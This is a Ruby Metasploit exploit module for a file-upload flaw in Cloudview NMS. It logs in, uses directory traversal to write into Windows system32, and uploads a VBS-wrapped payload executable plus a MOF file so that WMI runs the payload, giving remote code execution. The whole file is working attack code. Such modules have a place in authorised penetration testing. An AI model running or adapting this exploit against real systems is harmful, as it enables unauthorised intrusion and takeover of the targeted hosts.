require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Cloudview NMS File Upload',
			'Description'    => %q{
				This module exploits a file upload vulnerability
				found within Cloudview NMS < 2.00b. The vulnerability
				is triggered by sending specialized packets to the
				server with directory traversal sequences (..@ in
				this case) to browse outside of the web root.
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', '0day' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Cloudview NMS 2.00b on Windows', {} ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 13 2014'))

		register_options([
			Opt::RPORT(80),
			OptString.new('USERNAME', [ true, "The username to log in with", "Admin" ]),
			OptString.new('PASSWORD', [ false, "The password to log in with", "" ])
		], self.class )
	end

	def exploit

		# setup
		vbs_name	= rand_text_alpha(rand(10)+5) + '.vbs'
		exe			= generate_payload_exe
		vbs_content	= Msf::Util::EXE.to_exe_vbs(exe)
		mof_name	= rand_text_alpha(rand(10)+5) + '.vbs'
		mof			= generate_mof(mof_name, vbs_name)
		peer		= "#{datastore['RHOST']}:#{datastore['RPORT']}"

		print_status("Uploading #{vbs_name} to #{peer}...")

		# logging in to get the "session"
		@sess = rand(0..2048)
		res = send_request_cgi({
			'method'	=>	'POST',
			'uri'		=>	"/MPR=#{@sess}:/",
			'version'	=>	'1.1',
			'ctype'		=>	'application/x-www-form-urlencoded',
			'data'		=>	"username=#{datastore['USERNAME']}&password=#{datastore['PASSWORD']}&mybutton=Login%21&donotusejava=html"
		})

		# This is needed to setup the upload directory
		res = send_request_cgi({
			'method'	=> 'GET',
			'uri'		=> "/MPR=#{@sess}:/descriptor!ChangeDir=C:@..@..@..@WINDOWS@system32@!-!-!@extdir%5Cfilelistpage!-!1000",
			'version'	=> '1.1',
		})

		# Uploading VBS file
		data = Rex::MIME::Message.new
		data.add_part("#{vbs_content}", "application/octet-stream", nil, "form-data; name=\"upfile\"; filename=\"#{vbs_name}\"")
		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, "--_Part_")

		res = send_request_cgi({
			'method'	=>	'POST',
			'uri'		=>	"/MPR=#{@sess}:/",
			'version'	=>	'1.1',
			'ctype'		=>	"multipart/form-data; boundary=#{data.bound}",
			'data'		=>	post_data
		})

		if res.body =~ /Uploaded file OK/
			print_good("Uploaded #{vbs_name} successfully!")
			print_status("Uploading #{mof_name} to #{peer}...")

			# Setting up upload directory
			res = send_request_cgi({
				'method'	=>	'GET',
				'uri'		=>	"/MPR=#{@sess}:/descriptor!ChangeDir=C:@..@..@..@WINDOWS@system32@wbem@mof@!-!-!@extdir%5Cfilelistpage!-!1000",
				'version'	=>	'1.1'
			})

			# Uploading MOF file
			data = Rex::MIME::Message.new
			data.add_part("#{mof}", "application/octet-stream", nil, "form-data; name=\"upfile\"; filename=\"#{mof_name}\"")
			post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, "--_Part_")

			res = send_request_cgi({
				'method'	=>	'POST',
				'uri'		=>	"/MPR=#{@sess}:/",
				'version'	=>	'1.1',
				'ctype'		=>	"multipart/form-data; boundary=#{data.bound}",
				'data'		=>	post_data
			})

			if res.body =~ /Uploaded file OK/
				print_good("Uploaded #{mof_name} successfully!")
			else
				print_error("Something went wrong...")
			end
		else
			print_error("Something went wrong...")
		end

	end

end
